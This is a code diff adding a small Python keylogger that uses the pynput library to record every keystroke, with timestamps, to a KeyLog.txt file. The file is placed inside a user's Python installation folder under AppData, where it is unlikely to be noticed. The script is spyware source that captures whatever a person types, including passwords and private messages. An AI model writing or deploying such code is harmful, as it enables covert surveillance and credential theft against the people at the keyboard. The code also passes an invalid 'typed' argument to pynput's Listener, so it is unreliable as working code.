@@ -1,0 +1,12 @@
+import pynput
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir = r"C:\Users\Cleiton Melo\AppData\Local\Programs\Python\Python310"
+logging.basicConfig(filename = (log_dir + r"/KeyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def typed(key):
+    logging.info(str(key))
+
+with Listener(typed=typed) as listener:
+    listener.join()
